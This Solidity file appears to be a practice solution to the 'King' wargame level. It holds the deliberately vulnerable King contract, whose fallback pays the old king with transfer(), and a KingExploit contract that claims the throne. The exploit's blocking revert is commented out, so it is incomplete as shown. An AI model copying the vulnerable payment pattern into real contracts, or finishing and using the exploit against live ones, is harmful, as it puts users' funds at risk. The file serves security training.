// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol"; 

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  fallback() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;

    // console.log(king); 
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


contract KingExploit {
  uint public iterateTo = 1;

  function claimTrone(address payable _king) public payable {
    address(_king).call.value(msg.value)("");
  }

  fallback() external payable{
    if (address(this).balance > 0 ){
      // revert("king is forever banned"); 
    }
    console.log("passed");
  }
}